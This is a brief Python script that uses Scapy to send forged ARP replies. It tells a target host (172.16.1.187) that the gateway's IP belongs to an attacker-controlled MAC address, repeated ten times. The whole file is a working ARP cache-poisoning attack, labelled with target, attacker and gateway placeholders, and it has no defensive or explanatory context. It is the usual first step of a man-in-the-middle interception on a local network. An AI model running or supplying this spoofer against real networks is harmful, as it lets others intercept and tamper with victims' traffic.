#!/usr/bin/env python
from scapy.all import *

a = ARP()
a.pdst = "172.16.1.187"		# TARGET_IP
a.hwsrc = "11:22:33:44:55:66"	# ATTACKER_ETHER
a.psrc = "172.16.1.2"		# GATEWAY_IP
a.hwdst = "ff:ff:ff:ff:ff:ff"

send(a, inter=1, count=10)

